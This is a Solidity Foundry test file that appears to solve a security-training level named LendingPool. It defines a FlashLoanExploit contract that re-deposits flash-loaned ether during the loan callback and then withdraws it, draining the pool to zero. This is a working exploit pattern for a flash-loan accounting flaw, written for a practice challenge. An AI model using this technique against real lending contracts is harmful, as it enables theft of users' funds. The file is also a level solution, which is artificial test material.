// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "../src/08_LendingPool/LendingPool.sol";

// forge test --match-contract LendingPoolTest -vvvv
contract LendingPoolTest is BaseTest {
    LendingPool instance;

    function setUp() public override {
        super.setUp();
        instance = new LendingPool{value: 0.1 ether}();
    }

    function testExploitLevel() public {
        uint256 deposit = address(instance).balance;
        FlashLoanExploit exploiter = new FlashLoanExploit(instance, deposit);

        vm.prank(address(exploiter));
        instance.flashLoan(deposit);

        vm.prank(address(exploiter));
        instance.withdraw();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(
            address(instance).balance == 0,
            "Solution is not solving the level"
        );
    }
}

contract FlashLoanExploit is IFlashLoanReceiver {
    LendingPool public pool;
    uint256 deposit;

    constructor(LendingPool _pool, uint256 _deposit) {
        pool = _pool;
        deposit = _deposit;
    }

    function execute() external payable override {
        pool.deposit{value: deposit}();
    }

    receive() external payable {}
}
